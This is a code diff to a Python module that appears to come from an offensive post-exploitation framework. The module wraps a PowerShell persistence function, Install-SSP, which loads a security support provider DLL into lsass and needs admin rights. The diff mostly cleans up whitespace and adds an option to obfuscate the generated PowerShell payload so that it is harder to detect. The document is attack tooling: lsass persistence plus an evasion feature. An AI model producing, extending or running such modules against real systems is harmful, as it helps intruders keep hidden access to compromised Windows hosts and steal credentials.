@@ -1,3 +1,4 @@
+import os.path
 from lib.common import helpers
 
 class Module:
@@ -14,13 +15,13 @@ class Module:
             'Background' : True,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : True,
 
             'OpsecSafe' : False,
-            
+
             'MinPSVersion' : '2',
-            
+
             'Comments': [
                 'https://github.com/mattifestation/PowerSploit/blob/master/Persistence/Persistence.psm1'
             ]
@@ -45,7 +46,7 @@ class Module:
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
-        
+
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
@@ -53,7 +54,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         script = """
 function Install-SSP
@@ -115,43 +116,43 @@ into lsass, the dll must export SpLsaModeInitialize.
             [String]
             $Path
         )
-    
+
         # Parse PE header to see if binary was compiled 32 or 64-bit
         $FileStream = New-Object System.IO.FileStream($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
-    
+
         [Byte[]] $MZHeader = New-Object Byte[](2)
         $FileStream.Read($MZHeader,0,2) | Out-Null
-    
+
         $Header = [System.Text.AsciiEncoding]::ASCII.GetString($MZHeader)
         if ($Header -ne 'MZ')
         {
             $FileStream.Close()
             Throw 'Invalid PE header.'
         }
-    
+
         # Seek to 0x3c - IMAGE_DOS_HEADER.e_lfanew (i.e. Offset to PE Header)
         $FileStream.Seek(0x3c, [System.IO.SeekOrigin]::Begin) | Out-Null
-    
+
         [Byte[]] $lfanew = New-Object Byte[](4)
-    
+
         # Read offset to the PE Header (will be read in reverse)
         $FileStream.Read($lfanew,0,4) | Out-Null
         $PEOffset = [Int] ('0x{0}' -f (( $lfanew[-1..-4] | % { $_.ToString('X2') } ) -join ''))
-    
+
         # Seek to IMAGE_FILE_HEADER.IMAGE_FILE_MACHINE
         $FileStream.Seek($PEOffset + 4, [System.IO.SeekOrigin]::Begin) | Out-Null
         [Byte[]] $IMAGE_FILE_MACHINE = New-Object Byte[](2)
-    
+
         # Read compiled architecture
         $FileStream.Read($IMAGE_FILE_MACHINE,0,2) | Out-Null
         $Architecture = '{0}' -f (( $IMAGE_FILE_MACHINE[-1..-2] | % { $_.ToString('X2') } ) -join '')
         $FileStream.Close()
-    
+
         if (($Architecture -ne '014C') -and ($Architecture -ne '8664'))
         {
             Throw 'Invalid PE header or unsupported architecture.'
         }
-    
+
         if ($Architecture -eq '014C')
         {
             Write-Output '32-bit'
@@ -260,6 +261,11 @@ into lsass, the dll must export SpLsaModeInitialize.
         for option,values in self.options.iteritems():
             if option.lower() != "agent":
                 if values['Value'] and values['Value'] != '':
-                    script += " -" + str(option) + " " + str(values['Value']) 
+                    script += " -" + str(option) + " " + str(values['Value'])
 
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
         return script
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        return
